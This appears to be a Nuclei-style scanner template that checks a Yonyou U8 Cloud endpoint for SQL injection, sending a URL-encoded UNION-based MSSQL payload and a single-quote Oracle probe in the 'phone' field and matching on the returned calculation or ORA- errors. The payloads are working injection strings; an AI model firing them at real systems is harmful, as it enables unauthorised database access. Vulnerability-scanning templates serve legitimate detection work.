id: yongyou-u8c-AppPhoneServletService-sqli

info:
  name: yongyou-u8c-AppPhoneServletService-sqli
  author: msk
  severity: high



http:
  - raw:
      - |
        POST /service/~erm/nc.pubitf.erm.mobile.appservice.AppPhoneServletService HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        Accept-Encoding: gzip, deflate
        Accept: */*
        Connection: keep-alive
        Content-Type: application/x-www-form-urlencoded
        accountCode: U8cloud

        {{payload}}


    stop-at-first-match: true
    payloads:
      payload:
        #mssql
        - module=sm&method=getUserInfoByPhone&phone=1%27%20UNION%20ALL%20SELECT%20NULL%2CNULL%2CNULL%2CCHAR%28113%29%2BCHAR%28120%29%2BCHAR%28113%29%2BCHAR%28113%29%2BCHAR%28113%29%2BISNULL%28CAST%28111%2A111%20AS%20NVARCHAR%284000%29%29%2CCHAR%2832%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL--%20EcHm
        #oracle
        - module=sm&method=getUserInfoByPhone&phone=1'


    matchers:
      - type: dsl
        condition: or
        dsl:
          - status_code==200 && contains_all(body,"12321","ucode")
          - status_code==200 && contains_all(body,"errormsg","ORA-")